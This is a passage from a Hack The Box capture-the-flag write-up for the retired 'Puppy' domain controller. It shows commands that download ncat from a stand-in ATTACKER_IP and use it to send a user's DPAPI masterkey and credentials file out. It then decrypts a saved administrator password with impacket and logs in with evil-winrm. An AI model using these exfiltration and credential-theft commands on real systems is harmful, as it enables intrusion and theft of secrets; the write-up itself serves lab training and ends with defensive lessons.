    MasterKey: C:\Users\steph.cooper\AppData\Roaming\Microsoft\Protect\S-1-5-21-1487982659-1829050783-2281216199-1107\556a2412-1275-4ccf-b721-e6a0b4f90407
    Accessed: 3/8/2025 7:40:36 AM
    Modified: 3/8/2025 7:40:36 AM
   =================================================================================================


ÉÍÍÍÍÍÍÍÍÍÍ¹ Checking for DPAPI Credential Files
È  https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#dpapi
    CredFile: C:\Users\steph.cooper\AppData\Local\Microsoft\Credentials\DFBE70A7E5CC19A398EBF1B96859CE5D
    Description: Local Credential Data

    MasterKey: 556a2412-1275-4ccf-b721-e6a0b4f90407
    Accessed: 3/8/2025 8:14:09 AM
    Modified: 3/8/2025 8:14:09 AM
    Size: 11068
   =================================================================================================

    CredFile: C:\Users\steph.cooper\AppData\Roaming\Microsoft\Credentials\C8D69EBE9A43E9DEBF6B5FBD48B521B9
    Description: Enterprise Credential Data

    MasterKey: 556a2412-1275-4ccf-b721-e6a0b4f90407
    Accessed: 3/8/2025 7:54:29 AM
    Modified: 3/8/2025 7:54:29 AM
    Size: 414
   =================================================================================================

<SNIP>
```

### 🧪 Exploitation

I shared `ncat` on the attack host.

```
fcoomans@kali:~/htb/puppy$ python -m http.server -d /usr/share/windows-resources/ncat
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

And downloaded it on the target.

```
*Evil-WinRM* PS C:\Users\steph.cooper\AppData\Local\Temp> iwr http://ATTACKER_IP:8000/ncat.exe -outfile ncat.exe
```

I started a `ncat` listener on the attack host to receive a file and save the contents as `loot/masterkey`.

```
fcoomans@kali:~/htb/puppy$ ncat -lvnp 4444 --recv-only >loot/masterkey
Ncat: Version 7.95 ( https://nmap.org/ncat )
Ncat: Listening on [::]:4444
Ncat: Listening on 0.0.0.0:4444
```

`ncat` on the target was then used to send the masterkey to the attack host.

```
*Evil-WinRM* PS C:\Users\steph.cooper\AppData\Local\Temp> cmd /c "ncat ATTACKER_IP 4444 --send-only <C:\Users\steph.cooper\AppData\Roaming\Microsoft\Protect\S-1-5-21-1487982659-1829050783-2281216199-1107\556a2412-1275-4ccf-b721-e6a0b4f90407"
```

A new `ncat` listener was then started to download the encrypted credentials file as `loot/creds`.

```
fcoomans@kali:~/htb/puppy$ ncat -lvnp 4444 --recv-only >loot/creds
Ncat: Version 7.95 ( https://nmap.org/ncat )
Ncat: Listening on [::]:4444
Ncat: Listening on 0.0.0.0:4444
```

`ncat` on the target was once again used, but this time to send the encrypted credentials file.

```
*Evil-WinRM* PS C:\Users\steph.cooper\AppData\Local\Temp> cmd /c "ncat ATTACKER_IP 4444 --send-only <C:\Users\steph.cooper\AppData\Roaming\Microsoft\Credentials\C8D69EBE9A43E9DEBF6B5FBD48B521B9"
```

#### 🔼 Priv Esc to Steph Cooper Adm

`impacket-dpapi` was then used to extract the decryption key from the master key file.

```
fcoomans@kali:~/htb/puppy$ impacket-dpapi masterkey -file loot/masterkey -sid S-1-5-21-1487982659-1829050783-2281216199-1107 -password ChefSteph2025!
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[MASTERKEYFILE]
Version     :        2 (2)
Guid        : 556a2412-1275-4ccf-b721-e6a0b4f90407
Flags       :        0 (0)
Policy      : 4ccf1275 (1288639093)
MasterKeyLen: 00000088 (136)
BackupKeyLen: 00000068 (104)
CredHistLen : 00000000 (0)
DomainKeyLen: 00000174 (372)

Decrypted key with User Key (MD4 protected)
Decrypted key: 0xd9a570722fbaf7149f9f9d691b0e137b7413c1414c452f9c77d6d8a8ed9efe3ecae990e047debe4ab8cc879e8ba99b31cdb7abad28408d8d9cbfdcaf319e9c84
```

And the decrypted key was then used to decrypt the credentials in the `loot/creds` file.  This showed that the saved password for `steph.cooper_adm` was `FivethChipOnItsWay2025!`.

```
fcoomans@kali:~/htb/puppy$ impacket-dpapi credential -key 0xd9a570722fbaf7149f9f9d691b0e137b7413c1414c452f9c77d6d8a8ed9efe3ecae990e047debe4ab8cc879e8ba99b31cdb7abad28408d8d9cbfdcaf319e9c84 -file loot/creds
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[CREDENTIAL]
LastWritten : 2025-03-08 15:54:29+00:00
Flags       : 0x00000030 (CRED_FLAGS_REQUIRE_CONFIRMATION|CRED_FLAGS_WILDCARD_MATCH)
Persist     : 0x00000003 (CRED_PERSIST_ENTERPRISE)
Type        : 0x00000002 (CRED_TYPE_DOMAIN_PASSWORD)
Target      : Domain:target=PUPPY.HTB
Description :
Unknown     :
Username    : steph.cooper_adm
Unknown     : FivethChipOnItsWay2025!
```

`nxc` confirmed that the password was still valid and since this user was a member of the `Administrators` groups, also printed `Pwn3d!` as the domain was now compromised.

```
fcoomans@kali:~/htb/puppy$ nxc smb dc.puppy.htb -u steph.cooper_adm -p FivethChipOnItsWay2025!
SMB         10.10.11.70     445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:PUPPY.HTB) (signing:True) (SMBv1:False)
SMB         10.10.11.70     445    DC               [+] PUPPY.HTB\steph.cooper_adm:FivethChipOnItsWay2025! (Pwn3d!)
```

Logging into the server as this user indeed revealed that the user was a member of the `Administrators` group.

```
fcoomans@kali:~/htb/puppy$ evil-winrm -i dc.puppy.htb -u steph.cooper_adm -p FivethChipOnItsWay2025!

Evil-WinRM shell v3.7

Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\steph.cooper_adm\Documents> whoami
puppy\steph.cooper_adm
*Evil-WinRM* PS C:\Users\steph.cooper_adm\Documents> whoami /groups

GROUP INFORMATION
-----------------

Group Name                                 Type             SID          Attributes
========================================== ================ ============ ===============================================================
Everyone                                   Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Administrators                     Alias            S-1-5-32-544 Mandatory group, Enabled by default, Enabled group, Group owner
BUILTIN\Users                              Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                       Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization             Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication           Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\High Mandatory Level       Label            S-1-16-12288
```

### 💰 Post Exploitation
#### 🏆 root.txt

`steph.cooper_adm` could, therefore, read the Administrator user's `root.txt` flag.

```
*Evil-WinRM* PS C:\Users\steph.cooper_adm\Documents> type C:\Users\Administrator\Desktop\root.txt
ccb65396b7de33e1bb363182797d1371
```

Turns out this Puppy wasn’t house-trained… it left secrets all over the place. 🐶

And `Puppy has been Pwned!` 🎉

![](images/Pasted%20image%2020250717172539.png)

## 📚 Lessons Learned

- **Weak vault/master passwords defeat cryptographic protections:** KeePassXC (and similar vaults) have mechanisms to slow brute force, but those protections are irrelevant when the master password is guessable (e.g., present in rockyou.txt). Entropy matters more than tooling.
- **ACL/ACE abuse is an easy privilege-escalation vector:**  Writable group memberships or ACLs that allow users to add members (or re-enable accounts) create simple, high-impact attack paths (Ant → Adam in this case).
- **Backups can contain sensitive plaintext:** Unencrypted or poorly segmented backups often contain credentials and should never be accessible to low-privileged users.
- **DPAPI-extracted secrets lead to full compromise:**  Once an account’s DPAPI material is stolen and the user profile is accessible, saved credentials can be decrypted — leading to lateral movement and privilege escalation.

## ⚠️ Disclaimer

This write-up covers a retired HTB machine and is for educational purposes only. All IPs, credentials, and flags exist in a lab environment. My username matches my GitHub handle and is intentionally used to build my cybersecurity brand.
